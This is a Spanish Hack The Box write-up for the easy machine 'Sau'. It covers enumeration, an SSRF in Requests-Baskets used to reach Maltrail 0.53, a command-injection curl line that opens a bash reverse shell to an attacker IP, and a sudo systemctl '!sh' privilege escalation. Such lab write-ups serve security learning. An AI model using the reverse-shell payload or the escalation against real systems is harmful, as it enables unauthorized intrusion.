---
title: Write-up Sau [Easy] - Hack The Box
date: 2023-07-31
categories: [Writeups, Hack The Box]
tags: [writeup, hackthebox, machines, easy, pentesting]
image: /assets/img/hackthebox/machines/sau/sau.png
image_link: false
---

Publicación del write-up de sujeto a las [guías generales](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines) de Hack The Box.

# Write-up Sau \[Easy\] - Hack The Box 
\\
**Mi perfil de Hack The Box: [julianglez16](https://app.hackthebox.com/users/1084561)**


# Enumeración


### Puertos


![Untitled.png](/assets/img/hackthebox/machines/sau/puertos1.png)
![Untitled.png](/assets/img/hackthebox/machines/sau/puertos2.png)


### Tecnologías web


![Untitled.png](/assets/img/hackthebox/machines/sau/tecnologias-web.png)



### Funcionalidad web


Se accede a una página que permite crear “Baskets” y registra las peticiones HTTP que recibe 


![Untitled.png](/assets/img/hackthebox/machines/sau/funcionalidad-web1.png)



### Análisis con BurpSuite


Al crear una Basket nueva:


![Untitled.png](/assets/img/hackthebox/machines/sau/burpsuite1.png)

![Untitled.png](/assets/img/hackthebox/machines/sau/burpsuite2.png)



Al abrir el Basket se realiza una petición web


![Untitled.png](/assets/img/hackthebox/machines/sau/burpsuite3.png)



# Explotación


### Usuario


Requests-Basket tiene una vulnerabilidad SSRF [https://github.com/entr0pie/CVE-2023-27163](https://github.com/entr0pie/CVE-2023-27163). Con esta vulnerabilidad de puede realizar una petición al puerto `80` a través del _proxy response_ para ver qué servicio está expuesto en ese puerto (en la enumeración de puertos aparecía como _filtered_).


![Petición con el PoC disponible en el GitHub.](/assets/img/hackthebox/machines/sau/usuario1.png)


Tras hacer la petición se puede observar que hay un servicio llamado _Maltrail_ en la versión `0.53`. 


![Petición con el PoC disponible en el GitHub.](/assets/img/hackthebox/machines/sau/usuario3.png)



Esta versión de Maltrail es vulnerable a RCE [(https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/)](https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/)


Con el siguiente comando se debería obtener un reverse shell en la máquina:


```bash
curl 'http://10.10.11.224:80/login' --data 'username=;`bash -i >& /dev/tcp/10.10.16.44/1234 0>&1`'
```


Como no funciona (no sé por qué), se utiliza el siguiente exploit [https://github.com/spookier/Maltrail-v0.53-Exploit](https://github.com/spookier/Maltrail-v0.53-Exploit) para obtener un reverse shell exitosamente.


![Petición con el PoC disponible en el GitHub.](/assets/img/hackthebox/machines/sau/usuario3.png)


### Root


El usuario `puma` tiene permisos de `sudo` para ejecutar `systemctl status trail.service` por lo que se puede escalar privilegios fácilmente escribiendo `!sh` .


![Petición con el PoC disponible en el GitHub.](/assets/img/hackthebox/machines/sau/root1.png)



![Petición con el PoC disponible en el GitHub.](/assets/img/hackthebox/machines/sau/root2.png)


